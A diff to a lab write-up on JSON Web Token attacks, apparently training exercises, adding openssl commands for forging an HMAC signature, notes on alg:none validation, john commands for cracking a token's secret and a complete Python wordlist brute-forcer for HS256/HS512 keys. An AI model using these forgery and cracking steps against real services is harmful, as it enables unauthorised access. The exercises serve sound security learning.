@@ -113,20 +113,21 @@ Secret  : 6162636465666768696a6b6c6d6e6f70
 ```
 
 The tool `openssl` can be used to create this signature:
+Note that the padding of the Base64-encoded strings is removed.
 
 ```bash
 echo -n 'eyJhbGciOiJSU0EiLCJ0eXAiOiJKV1
-QifQ==.eyJpc3MiOiJtZSIsIm5hbWUiOiJUb210
-b20iLCJhZG1pbiI6ImZhbHNlIn0=' | openssl dgst -sha256 -mac HMAC -macopt hexkey:"6162636465666768696a6b6c6d6e6f70" -binary | base64
+QifQ.eyJpc3MiOiJtZSIsIm5hbWUiOiJUb210
+b20iLCJhZG1pbiI6ImZhbHNlIn0' | openssl dgst -sha256 -mac HMAC -macopt hexkey:"6162636465666768696a6b6c6d6e6f70" -binary | base64
 ```
 
 Based on this result, the full token can be assembled:
 
 ```
-eyJhbGciOiJSU0EiLCJ0eXAiOiJKV1QifQ==.ey
-Jpc3MiOiJtZSIsIm5hbWUiOiJUb210b20iLCJhZ
-G1pbiI6ImZhbHNlIn0=.x1OZmwN2JiyB9+A+sOI
-RwL31mzA9NXSozrkUGKgqBB4=
+eyJhbGciOiJSU0EiLCJ0eXAiOiJKV1QifQ.eyJp
+c3MiOiJtZSIsIm5hbWUiOiJUb210b20iLCJhZG1
+pbiI6ImZhbHNlIn0.qCkiyFoduhMTS9sfjnnbFf
+OdCAHEMjnvzqEpEzZEqkg
 ```
 
 ## Task 5
@@ -193,3 +194,164 @@ john --wordlist=<...>/rockyou.txt --format=HMAC-SHA512 jwt.txt
 6. Intercept the request that is send out when pressing the gargabe bin button next to the user switch button. This will send a POST request to delete all votes. Then, replace the cookie `access_token` with the new admin-token that has just been created. Sending this modified request should result in all votes being removed.
 
 ![Vote Fraud Step 6](.img/vote_fraud_5.png)
+
+## Task 9
+
+A JW-Token can be validatded by calculating the expected signature and comparing it the the actual
+signature attached to the token.
+
+Multiple different signing algorithms can be used for this, with one example being `HS512`.
+
+The signature is then calculated by appending the Base64-encoded header and payload of the token and
+signing it together with a secret key.
+
+```
+Signature = HS512(
+    base64(header) + "." + base64(payload),
+    secret
+)
+```
+
+## Task 10
+
+The first snippet throws an `InvalidTokenException`, as the string passed to the
+`parseClaimsJws()` method cannot be a full token, but only the claims.
+
+The second snipped will work as intended and deny the action while logging the error message
+"*You are not an admin user*". This is because the class will not accept the `alg: none` setting
+and attempt to validate the token using `JWT_PASSWORD` regardeless.
+
+Documentation for these methods was obtained here:
+
+[http://javadox.com/io.jsonwebtoken/jjwt/0.4/io/jsonwebtoken/JwtParser.html](http://javadox.com/io.jsonwebtoken/jjwt/0.4/io/jsonwebtoken/JwtParser.html)
+
+## Task 11
+
+The most conventional method to bruteforce a JW-Token would be `john`:
+
+```bash
+john --wordlist=<wordlist> --format=<algorithm> jwt.txt
+```
+
+For the specific task, the command would look like this:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt
+```
+
+The script can also be found here: [jwt\_bruteforcer - Github](https://github.com/B1TC0R3/jwt_bruteforcer/tree/main)
+
+```python
+# Copyright 2023 Thomas Gingele https://github.com/B1TC0R3
+
+from Crypto.Hash import HMAC, SHA256, SHA512
+from base64 import b64encode, b64decode
+import argparse
+
+
+def get_args() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(
+        prog="JWT Brute Force Script",
+        epilog="Copyright 2023 Thomas Gingele https://github.com/B1TC0R3"
+    )
+
+    algorithm_group = parser.add_mutually_exclusive_group()
+
+    parser.add_argument(
+        "-t",
+        "--token",
+        help="the input file containing the JW-Token",
+        required=True
+    )
+
+    parser.add_argument(
+        "-w",
+        "--wordlist",
+        help="a wordlist to attack the JW-Token",
+        required=True
+    )
+
+    algorithm_group.add_argument(
+        "--hs256",
+        action="store_true",
+        help="use HMAC-SHA256 algorithm (default)",
+        required=False
+    )
+
+    algorithm_group.add_argument(
+        "--hs512",
+        action="store_true",
+        help="use HMAC-SHA512 algorithm",
+        required=False
+    )
+
+    args = parser.parse_args()
+    return args
+
+
+def dissect_jwt(token) -> tuple[str, str, str]:
+    token_fields = token.split('.')
+
+    if len(token_fields) != 3:
+        raise Exception("Invalid JWT Format")
+
+    header    = token_fields[0]
+    payload   = token_fields[1]
+    signature = token_fields[2]
+
+    return (header, payload, signature)
+
+
+def get_digest_modifier(args):
+    if args.hs512:
+        return SHA512
+    else:
+        return SHA256
+
+
+def jwt_format(signature) -> str:
+    return signature.decode()\
+                    .replace("+", "-")\
+                    .replace("/", "_")\
+                    .replace("=", "")
+
+
+def main():
+    token = None
+
+    args = get_args()
+
+    with open(args.token, 'r') as token_file:
+        token = token_file.read().strip()
+
+    (header, payload, signature) = dissect_jwt(token)
+    digestmod                    = get_digest_modifier(args)
+
+    public_signature_component = f"{header}.{payload}"
+
+    with open(args.wordlist, 'r') as wordlist:
+        while key := wordlist.readline().strip():
+            algorithm = HMAC.new(
+                key.encode(), 
+                public_signature_component.encode(),
+                digestmod=digestmod
+            )
+
+            guessed_signature = jwt_format(
+                b64encode(
+                    algorithm.digest()
+                )
+            )
+
+            if (signature == guessed_signature):
+                print(f"KEY :: {key}")
+                break;
+
+
+if __name__ == "__main__":
+    main() 
+```
+
+## Task 12
+
+
